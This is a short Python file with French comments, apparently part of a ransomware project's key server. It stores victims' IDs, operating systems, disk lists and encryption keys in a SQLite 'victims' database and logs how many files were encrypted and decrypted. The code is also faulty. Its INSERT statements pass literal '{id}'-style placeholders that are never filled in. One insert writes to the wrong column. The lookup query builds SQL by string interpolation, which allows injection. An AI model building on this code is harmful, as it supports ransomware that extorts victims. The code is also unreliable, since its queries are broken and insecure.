import sqlite3
connexion = sqlite3.connect("../serveur_cles/data/victims.sqlite")  #BDD dans le fichie

curseur = connexion.cursor()  #Récupération d'un curseur
list=[]

def ajoutvictim(id,os, hash,disk, key):
    curseur.executescript("""INSERT INTO victims(id_victim, os, hash, disks, key) VALUES ({id},{os},{hash},{disk},{key});""")
def ajoutdecrypted(id_decrypted, id_victim,datetime, nb_file):
    curseur.executescript("""INSERT INTO decrypted(id_decrypted, id_victim, datetime, nb_file) VALUES ({id_decrypted},{id_victim},{datetime},{nb_file});""")
def ajoutstates(id_state,id_victim ,datetime ,nb_file):
    curseur.executescript("""INSERT INTO states(id_state, id_victim, datetime, nb_file) VALUES ({id_state},{id_victim},{datetime},{nb_file});""")
def ajoutencrypted(id_encrypted, id_victim, datetime, nb_file):
    curseur.executescript("""INSERT INTO encrypted(id_decrypted, id_victim, datetime, nb_file) VALUES ({id_encrypted},{id_victim},{datetime},{nb_file});""")

#chercher dans la bd
#python
def recup_data_victime(id=False):
    if not id:
        curseur.execute("SELECT * FROM victims")
        resultats = curseur.fetchall()
        for resultat in resultats:
            list.append(resultat)
        return list
    else:
        curseur.execute(f"SELECT * FROM victims WHERE id_victim ={id}")
        resultats = curseur.fetchone()
        for resultat in resultats:
            list.append(resultat)
        return list

print(recup_data_victime())
connexion.close()  #Déconnexion

